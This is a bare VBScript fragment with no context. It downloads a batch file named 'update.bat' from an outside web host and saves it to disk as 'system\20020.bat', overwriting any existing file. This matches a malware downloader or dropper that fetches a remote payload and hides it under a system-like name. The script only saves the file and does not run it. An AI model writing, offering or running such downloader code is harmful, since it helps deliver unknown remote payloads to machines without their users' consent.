dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://nfox.co/update.bat", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "system\20020.bat", 2 '//overwrite
end with
